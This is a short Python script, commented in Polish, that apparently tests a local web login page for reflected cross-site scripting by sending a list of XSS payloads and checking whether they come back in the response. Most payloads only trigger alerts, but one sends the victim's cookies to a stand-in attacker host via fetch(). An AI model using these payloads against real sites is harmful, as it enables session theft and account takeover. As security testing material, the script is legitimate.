import requests
from bs4 import BeautifulSoup
import time

def test_xss_vulnerability(url, payloads):
    print(f"Testowanie podatnosci XSS na {url}")
    
    for payload in payloads:
        try:
            print(f"\nTestowanie payloadu: {payload}")
            print(f"Wysylanie zapytania GET do {url}")
            
            # Wysylanie zapytania GET z payloadem jako parametr
            params = {'input': payload}
            response = requests.get(url, params=params)
            
            print(f"Otrzymano odpowiedz z kodem: {response.status_code}")
            
            # Sprawdzanie czy payload jest odzwierciedlony w odpowiedzi
            if payload in response.text:
                print(f"Znaleziono potencjalna podatnosc XSS!")
                print(f"Payload: {payload}")
                print(f"Kod statusu: {response.status_code}")
            else:
                print(f"Payload nie zostal odzwierciedlony w odpowiedzi")
            
            # Dodanie opoznienia aby nie przeciazyc serwera
            print("Oczekiwanie 1 sekundy przed nastepnym testem")
            time.sleep(1)
            
        except requests.exceptions.RequestException as e:
            print(f"Blad: {e}")
            return

def main():
    # Adres URL docelowy
    target_url = "http://localhost:3000/#/login"
    
    # Lista payloadow XSS do przetestowania
    xss_payloads = [
        # Podstawowy payload ze skryptem
        "<script>alert('XSS')</script>",
        # XSS przez atrybut onerror w obrazku
        "<img src=x onerror=alert('XSS')>",
        # XSS przez element SVG
        "<svg/onload=alert('XSS')>",
        # XSS przez protokol javascript
        "javascript:alert('XSS')",
        # XSS przez zdarzenie onload w body
        "<body onload=alert('XSS')>",
        # XSS przez lamanie cudzyslowow
        "'\"><script>alert('XSS')</script>",
        # Pr√≥ba kradziezy ciasteczek
        "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
    ]
    
    print(f"Liczba payloadow do przetestowania: {len(xss_payloads)}")
    
    # Uruchomienie testu XSS
    test_xss_vulnerability(target_url, xss_payloads)
    

if __name__ == "__main__":
    main()
